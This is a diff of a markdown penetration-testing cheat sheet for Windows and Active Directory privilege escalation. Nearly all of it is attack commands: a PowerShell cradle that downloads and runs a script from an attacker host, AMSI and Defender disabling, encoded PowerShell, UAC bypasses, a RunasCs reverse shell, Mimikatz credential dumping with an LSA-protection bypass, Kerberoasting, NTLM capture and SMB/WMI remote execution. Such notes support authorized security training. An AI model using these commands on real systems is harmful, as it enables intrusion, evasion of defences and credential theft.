@@ -20,7 +20,8 @@
             *   `httpserv()`
             *   `powershell -c iex(New-Object System.Net.WebClient).DownloadString('http://[KALI_IP]:8888/[SCRIPT]');[FUNCTION]`
         *   32/64-Bit Paths
-            *   Try Both → `where powershell` / `set` → Infer Architecture
+            *   PS Architecture → `[Environment]::Is64BitProcess`
+            *   OS Architecture → `[Environment]::Is64BitOperatingSystem`
             *   `c:\windows\syswow64\windowspowershell\v1.0\powershell.exe`
             *   `c:\windows\sysnative\windowspowershell\v1.0\powershell.exe`
     *   Netcat Upload
@@ -84,9 +85,10 @@
     *   [Citrix / Kiosk Breakouts](https://academy.hackthebox.com/module/67/section/626)
     *   Powershell
         *   AMSI
-            *   NXC Local Admin → `nxc smb [IP] [AUTH_STRING] -X '[PS_COMMAND]' --amsi-bypass [PAYLOAD_FILE]`
+            *   NXC                  → `nxc smb [IP] [AUTH_STRING] -X '[PS_COMMAND]' --amsi-bypass [PAYLOAD_FILE]`
+            *   Local Disable → `Set-MpPreference -DisableScriptScanning 1`
             *   [Payloads](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
-            *   [One-Liners](https://amsi.fail/)
+            *   [One-Liners](https://amsi.fail/) / [AMSBP](https://github.com/Dec0ne/AMS-BP/blob/master/AMSBP.ps1)
         *   AppLocker
             *   `Get-AppLockerPolicy -Effective | select -exp RuleCollections` 
             *   Could Also Block `exe` Files → `"This program is blocked by group policy"`
@@ -95,12 +97,15 @@
             *   `$ExecutionContext.SessionState.LanguageMode`
             *   [Bypasses](https://sp00ks-git.github.io/posts/CLM-Bypass/)
         *   Execution Policy
-            *   `powershell -noni -nop -ep bypass -w hidden -NoExit [COMMAND]` → Test B64 Also
+            *   `powershell -noni -nop -ep bypass -w hidden -NoExit [COMMAND]`
             *   `Set-ExecutionPolicy Bypass -Scope Process`   
+            *   B64 Encoding
+                *   `echo '[PS_CMD]' | iconv -t utf-16le | base64 -w 0`
+                *   `powershell -e [B64_STRING]`
     *   [AV](https://book.hacktricks.xyz/windows-hardening/av-bypass)
         *   Enumeration
-            *   `Get-MpComputerStatus`
-            *   `wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName`
+            *   `Get-MpComputerStatus` → Defender
+            *   `wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName` → Generic
         *   Exclusion Bypass
             *   `reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"`
             *   Malware in Exclusion Folder
@@ -126,10 +131,10 @@
         *   Member of "Administrators" → Restricted Privileges / File Access
         *   “Administrator” User               → To SYSTEM Shell
         *   Enumeration
-            *   `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA`
-            *   `reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin`
-        *   Bypasess
-            *   `[environment]::OSVersion.Version` → [UACME](https://github.com/hfiref0x/UACME)
+            *   `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA` → Check if `0x1`
+            *   `reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin` → Check if not `0x0`
+        *   Bypasess 
+            *   `[environment]::OSVersion.Version` → [UACME](https://github.com/hfiref0x/UACME) / `bypassuac-x[86/64].exe`
             *   RunAs
                 *   [PS Module](https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/management/Invoke-RunAs.ps1) / [Executable](https://github.com/antonioCoco/RunasCs/releases)
                 *   `.\RunasCs.exe [USER] [PASSWORD] cmd -r [KALI_IP]:[PORT]`
@@ -146,22 +151,25 @@
             *   RDP Access 
                 *   CMD/PS → Right-Click → “Run as Administrator”
                 *   Input User Credentials
+    *   Firewall
+        *   `powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow`
+        *   `powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property DisplayName,@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}},@{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Enabled, Profile,Direction,Action"`
 *   Domain Escalation
-    *   Admin Hunting
+    *   Local Admin Hunting
         *   `Find-LocalAdminAccess`
-        *   Credential Objects
+        *   SMB RCE
+            *   `Invoke-WMIExec`
+            *   `Invoke-SMBExec`
+        *   PS RCE
             *   Check if member of `"Remote Management Users"`
             *   `$pass = ConvertTo-SecureString "[PASS]" -AsPlainText -Force`
             *   `$cred = New-Object -TypeName System.Management.Automation.PSCredential("[USER]", $pass)`
             *   `Invoke-Command -Cred $cred -ScriptBlock{[COMMAND]} -ComputerName [REMOTE_HOSTNAME]`
-        *   PS Remoting
-            *   `Enable-PSRemoting`
-            *   `$sess = New-PSSession -ComputerName [REMOTE_HOSTNAME]`
-            *   `Enter-PSSession -Session $sess [-Cred $cred]`
-            *   File Transfers → `Copy-Item` + From/To Session Variable
-        *   SMB RCE
-            *   `Invoke-WMIExec`
-            *   `Invoke-SMBExec`
+            *   Remoting
+                *   `Enable-PSRemoting`
+                *   `$sess = New-PSSession -ComputerName [REMOTE_HOSTNAME]`
+                *   `Enter-PSSession -Session $sess [-Cred $cred]`
+                *   File Transfers → `Copy-Item` + From/To Session Variable
     *   Domain Roasting
         *   `Invoke-Rubeus -Command "asreproast /domain:[DOMAIN] /nowrap"`
         *   `Invoke-Rubeus -Command “kerberoast /domain:[DOMAIN] /nowrap”`
@@ -179,7 +187,7 @@
         *   [PowerUP-SQL Sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
         *   [Exploitations](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/abusing-ad-mssql#mssql-basic-abuse)
 *   Users
-    *   Service Accounts < Normal Users < Administrator → Determine EOP Path
+    *   Service Accounts < Normal Users < Local Admin / Administrator / SYSTEM → Determine EOP Path
     *   Authentication
         *   Local Passwords
             *   `net user [USERNAME]`
@@ -261,6 +269,9 @@
                     *   `mimikatz '"privilege::debug" "token::elevate" "sekurlsa::logonPasswords"'`
                     *   `mimikatz '"privilege::debug" "token::elevate" "sekurlsa::dpapi"'`
                     *   `mimikatz ‘"privilege::debug" "token::elevate" "sekurlsa::credman"’`
+                    *   LSA Bypass
+                        *   `reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa` → Check if Enabled
+                        *   `misc::memssp` → `privilege::debug` → `!+` → `!processprotect /process:lsass.exe /remove`
                 *   SAM / LSA Dumping
                     *   `mimikatz '"privilege::debug" "token::elevate" "lsadump::sam"'`
                     *   `mimikatz '"privilege::debug" "token::elevate" "lsadump::lsa /patch"'`
@@ -310,10 +321,17 @@
             *   DB Files                 → `*[db/database/settings/config].*`, `*.db`, `.sql*`
             *   Code Analysis      → Sensitive Exposure / Docker Files / Inputs & Functions / Connection Strings / Dependencies
             *   Write Privileges   → WebShell + LOCAL/NETWORK Impersonate Escalation
+            *   GIT Data
+                *   Directories → `.git` / `.gitignore`
+                *   `git log --oneline` 
+                *   `git status`
+                *   `git show [HASH]`
+                *   `git diff [HASH_1] [HASH_2]`
         *   SMB Access
             *   `Find-DomainShare -CheckShareAccess` 
             *   `Invoke-ShareFinder` /`Invoke-FileFinder`
             *   Shares
+                *   RDP Access → “This PC” + “Network” GUIs
                 *   `net use x: \\[HOST]\[SHARE] "[empty/password]" /u:[empty/Guest/user]`
             *   Password Scraping
                 *   `Snaffler.exe -s -d [DOMAIN] -o snaffler.log -v data`
@@ -322,12 +340,6 @@
                 *   [NTLM\_Theft](https://github.com/Greenwolf/ntlm_theft)
                 *   `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput`
                 *   Cracking  → `hashcat -m 5600`
-        *   GIT Repositories
-            *   Directories → `.git` / `.gitignore`
-            *   `git log --oneline` 
-            *   `git status`
-            *   `git show [HASH]`
-            *   `git diff [HASH_1] [HASH_2]`
         *   ADS Streams
             *   `dir /R [PATH]`
             *   `Get-Item * -Stream *`
